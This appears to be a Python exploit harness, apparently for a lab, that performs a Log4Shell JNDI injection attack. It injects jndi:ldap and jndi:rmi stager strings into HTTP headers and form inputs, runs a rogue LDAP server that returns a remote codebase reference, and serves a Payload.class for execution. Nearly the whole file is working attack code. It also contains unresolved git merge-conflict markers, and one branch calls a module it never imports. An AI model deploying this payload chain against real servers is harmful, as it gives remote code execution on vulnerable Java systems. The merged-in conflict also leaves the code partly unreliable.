#!/usr/bin/env python3
import asyncio
import pathlib
from bs4 import BeautifulSoup

from horrors import (
    logging,
    scenarios,
    services,
    triggers,
)


JNDI_PORTS = (
    1389,
    1099,
)

HTTP_HEADERS = (
    'Accept-Language',
    'User-Agent',
    'X-Forwarded-For',
    'X-Forwarded-Host',
    'X-Requested-With',
)

TARGETS = [
    'http://127.0.0.1:8080/endpoint',
]


# NOTE: This is where you want to experiment with filter bypassing:

STAGERS = [
    '${{jndi:rmi://{rhost}/}}',  # NOTE: Double brackets escape for string formatting
    
]
for port in JNDI_PORTS:
    STAGERS.append('${{jndi:ldap://{rhost}:' + str(port) + '/}}')


JNDI_RESPONSE = """dn:
javaClassName: Payload
javaCodeBase: http://{rhost}:{rport}/payload
objectClass: javaNamingReference
javaFactory: Payload
"""

class Serializer():
    """
    Stack-based Serialization utility.
    """

    __payload: bytes
    __size_stack: bytes

    def __init__(self):
        self.__payload = b""
        self.__size_stack = []

    def push(self, data: bytes) -> "Serializer":
        self.__last = data
        self.__payload = data + self.__payload
        return self

    def pop_size(self) -> "Serializer":
        return self.push(bytes([len(self.__payload) - self.__size_stack.pop()]))

    def push_size(self, count=1) -> "Serializer":
        for _ in range(count):
            self.__size_stack.append(len(self.__payload))

        return self

    def build(self) -> bytes:
        return self.__payload

    def __repr__(self) -> str:
        return f"Serializer{self.__payload}"


class LDAPResponse():
    """
    Builder for LDAP query response.
    """

    __query_name: str
    __attributes: dict

    def __init__(self, query_name: str, attributes: dict):
        self.__query_name = query_name
        self.__attributes = attributes

    def serialize(self) -> bytes:
        s = Serializer()
        s.push_size(2)
        for k, v in reversed(self.__attributes.items()):
            s.push_size(3).push(v.encode()).pop_size().push(b"\x04").pop_size().push(b"1")
            s.push_size().push(k.encode()).pop_size().push(b"\x04").pop_size().push(b"0")

        s.push(b"0\x81\x82")
        s.push_size().push(self.__query_name.encode()).pop_size().push(b"\x04").pop_size()
        s.push(b"\x02\x01\x02d\x81").pop_size().push(b"0\x81")

        SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
        return s.build() + SUCCESS_RESPONSE


class JNDI(services.Service):

    async def handler(self, reader, writer):
        logging.info('{}:{} requested data, responding with payload...'.format(*reader._transport._sock.getpeername()))
        await reader.read(8096)
        writer.write(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
        await asyncio.sleep(0.5)
        query = await reader.read(8096)
        query_name = query[9:9 + query[8:][0]].decode()
        response = LDAPResponse(query_name, {
            "javaClassName": "Payload",
            "javaCodeBase": "http://{rhost}:{rport}/payload".format(**self.scenario.context),
            "objectClass": "javaNamingReference",
            "javaFactory": "Payload"
        })
        writer.write(
            response.serialize()
        )
        await asyncio.sleep(0.5)
        acknowledge = await reader.read(8096)
        await writer.drain()

async def send_requests(scenario):

    for stager in STAGERS:
        stager = stager.format(**scenario.context)
        headers = {header: stager for header in HTTP_HEADERS}
        for target in TARGETS:
            response = await scenario.http_get(
                target,
                headers,
                scenario.context['proxy']
            )
            if response:
                input_fields = BeautifulSoup(response, 'html.parser').find_all('input')
                if input_fields:
                    data = {field.name: stager for field in input_fields}
                    response = await scenario.http_post(
                        target,
                        data,
                        headers,
                        scenario.context['proxy']
                    )


if __name__ == "__main__":

    context = {
        'rhost': '127.0.0.1',
        'rport': 8889,
        'proxy': '',
    }

    story = scenarios.Scenario(**context)

    httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
    httpd.add_route('/', 'Welcome')
<<<<<<< HEAD
    payload_path = pathlib.Path(pathlib.Path.cwd(), 'Payload.class')
    httpd.add_route('/payload', open(payload_path, 'rb').read())
    httpd.set_event('run', when=triggers.PathContains('send-requests'))
=======
    httpd.add_route('/payload', open(os.path.join(os.path.dirname(__file__), 'Payload.class'), 'rb').read())
>>>>>>> 39b0cc0 (Autorun)

    story.debug()
    for port in JNDI_PORTS:
        JNDI(story, address=context['rhost'], port=port)
    story.add_scene(send_requests)
    story.play()
